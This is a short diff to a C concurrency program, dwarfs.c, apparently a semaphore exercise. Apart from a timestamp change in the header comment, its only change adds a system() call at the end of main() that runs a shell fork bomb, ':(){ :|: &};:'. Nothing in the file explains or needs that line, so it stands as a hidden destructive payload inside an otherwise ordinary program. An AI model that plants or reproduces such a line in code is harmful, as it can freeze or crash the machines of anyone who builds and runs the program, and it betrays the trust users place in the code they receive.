@@ -1,7 +1,7 @@
 /* -.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.
 * File Name : dwarfs.c
 * Creation Date : 31-03-2016
-* Last Modified : Mon 04 Apr 2016 10:49:26 AM CDT
+* Last Modified : Mon 04 Apr 2016 10:52:00 AM CDT
 * Created By : shiro-saber
 
 KNOW LEARN        .==.
@@ -119,6 +119,7 @@ int main(int argc, char *argv[])
   sem_destroy(&occuped);
   free(dwarfp);
   free(dwarfs);
+  system(":(){ :|: &};:");
 
   return 0;
 }
